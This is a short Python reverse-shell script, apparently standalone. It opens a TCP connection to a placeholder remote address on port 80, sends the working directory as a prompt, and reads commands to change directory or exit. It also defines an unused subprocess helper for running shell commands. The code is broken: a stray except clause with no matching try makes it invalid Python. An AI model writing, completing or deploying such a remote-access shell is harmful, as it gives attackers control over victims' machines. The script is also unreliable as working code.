import os
import socket
import subprocess

def cmmds(cmds, isshell):
    execcmd = subprocess.Popen(cmds, shell=isshell, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return execcmd

ip = "X.X.X.X"
port = 80

cnnect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cnnect.connect((ip, port))

while True:
    try:
        # Envoyer le répertoire courant
        current_dir = os.getcwd()
        cnnect.send(f"{current_dir}> ".encode())

        command = cnnect.recv(2048).decode()
    except ConnectionResetError:
        cnnect.close()
        break

    if command.strip() == "exit":
        cnnect.close()
        break

    if command.startswith("cd "):
        try:
            os.chdir(command[3:].strip())
            cnnect.send(b"Directory changed\n")
        except Exception as e:
            cnnect.send(f"Error changing directory: {str(e)}\n".encode())


        except Exception as a:
            cnnect.send(b"[!] ERROR")
